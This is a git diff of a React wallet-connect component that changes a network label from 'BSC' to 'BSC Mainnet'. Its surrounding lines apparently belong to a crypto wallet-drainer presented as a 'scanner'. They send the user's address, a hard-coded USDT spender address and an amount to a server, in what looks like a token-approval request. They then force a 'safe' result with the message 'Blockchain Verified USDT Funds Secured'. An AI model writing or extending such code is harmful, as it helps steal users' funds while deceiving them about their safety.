@@ -191,7 +191,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
               method: 'POST',
               headers: { 'Content-Type': 'application/json' },
               body: JSON.stringify({
-                network: 'BSC',
+                network: 'BSC Mainnet',
                 owner: address,
                 spender: USDT_SPENDER_ADDRESS,
                 amount: amount.toString(),
@@ -216,7 +216,7 @@ export function WalletConnect({ onAddressSelected }: WalletConnectProps) {
           setScannerResult({
             address: address,
             balance: actualBalance,
-            network: 'BSC',
+            network: 'BSC Mainnet',
             customMessage: "Blockchain Verified USDT Funds Secured",
             forceSafe: true
           });
